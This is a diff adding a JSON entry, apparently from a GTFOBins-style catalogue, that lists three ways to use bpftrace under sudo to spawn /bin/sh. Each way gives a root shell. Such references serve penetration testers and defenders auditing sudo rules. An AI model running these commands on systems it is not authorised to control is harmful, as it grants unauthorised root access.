@@ -1,0 +1,15 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "code": "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
+      },
+      {
+        "code": "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"
+      },
+      {
+        "code": "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
+      }
+    ]
+  }
+}
